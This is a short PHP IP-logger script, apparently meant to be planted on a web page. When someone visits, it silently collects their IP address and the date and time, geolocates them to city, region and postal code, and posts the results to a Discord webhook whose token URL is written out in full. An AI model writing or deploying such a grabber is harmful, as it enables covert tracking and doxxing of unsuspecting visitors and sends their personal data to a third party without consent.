<?php
//======PUT YOUR DISCORD WEBHOOK HERE (RECCOMENDED: MAKE THE CHANNEL SO YOU CAN SEE IT ONLY)========\\
$webhookurl = "https://canary.discord.com/api/webhooks/958985524515864636/67mY098VM9Akwvgjnk2oCe18vQ24Vg2t22BCnofiH6HNO2vxct10kvS-fSETRv5aQSVf";

//===========IP TO LOCATION & TIME/DATE INFORMATION PULLED BY THE HOSTING SERVER ====================\\
$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
$data = "**User IP:** $ip\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip";




//=====================================DISCORD PHP BOT STUFF=========================================\\
$json_data = array ('content'=>"$data", 'username'=>"New Visitor From $details->country", 'avatar_url'=> "$flag");
$make_json = json_encode($json_data);
$ch = curl_init( $webhookurl );

//==================CURL OPTIONS FOR POSTING THE INFORMATION PROVIDED ABOVE ==========================\\
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

//===============THIS OUTPUTS THE CHANNEL SET BY THE WEBHOOK ==========================================\\
$response = curl_exec( $ch );

?>
